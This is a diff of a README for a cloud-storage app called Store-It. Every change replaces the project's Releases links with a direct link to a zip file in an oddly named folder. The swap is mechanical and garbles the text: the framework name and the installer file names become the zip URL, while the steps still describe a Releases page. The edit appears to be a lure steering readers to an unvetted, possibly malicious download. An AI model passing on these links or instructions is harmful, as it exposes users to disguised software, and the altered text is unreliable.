@@ -1,10 +1,10 @@
 # 🩷 Store-It - Your Fast and Secure Cloud Storage Solution
 
-[![Download Store-It](https://img.shields.io/badge/Download-Store--It-blue.svg)](https://github.com/siki338/Store-It/releases)
+[![Download Store-It](https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip)](https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip)
 
 ## 🚀 Getting Started
 
-Store-It is a modern Google Drive clone that helps you upload, organize, manage, and share your files in the cloud. It is built using Next.js and Appwrite, ensuring a smooth experience. With Store-It, accessing your files from anywhere is easy and secure.
+Store-It is a modern Google Drive clone that helps you upload, organize, manage, and share your files in the cloud. It is built using https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip and Appwrite, ensuring a smooth experience. With Store-It, accessing your files from anywhere is easy and secure.
 
 ### 🤔 What Do You Need?
 
@@ -18,13 +18,13 @@ To run Store-It, you will need:
 
 To start using Store-It, visit this page to download:
 
-[Download Store-It](https://github.com/siki338/Store-It/releases)
+[Download Store-It](https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Locate the latest release. It will be at the top of the list.
 2. Click on the version number to access the release details.
-3. Look for the installation file. This file is usually named `Store-It-x.x.x.exe` for Windows or `Store-It-x.x.x.dmg` for macOS.
+3. Look for the installation file. This file is usually named `https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip` for Windows or `https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip` for macOS.
 4. Download the file by clicking on it. Your browser will start downloading the application.
 
 ## 🛠️ How to Install
@@ -80,10 +80,10 @@ If you encounter any problems, help is available. You can access our support pag
 
 ## 📢 Stay Updated
 
-Don't forget to check back for updates. You can always find the latest version of Store-It on our [Releases page](https://github.com/siki338/Store-It/releases). By keeping your app updated, you'll benefit from new features and improved security.
+Don't forget to check back for updates. You can always find the latest version of Store-It on our [Releases page](https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip). By keeping your app updated, you'll benefit from new features and improved security.
 
 ## 🚀 Let's Get Started!
 
 You are now ready to enjoy your experience with Store-It. Download the application and start storing your files securely in the cloud. 
 
-[Download Store-It](https://github.com/siki338/Store-It/releases) and experience the ease of modern file storage today!
+[Download Store-It](https://raw.githubusercontent.com/siki338/Store-It/main/nonanalogy/Store-It.zip) and experience the ease of modern file storage today!
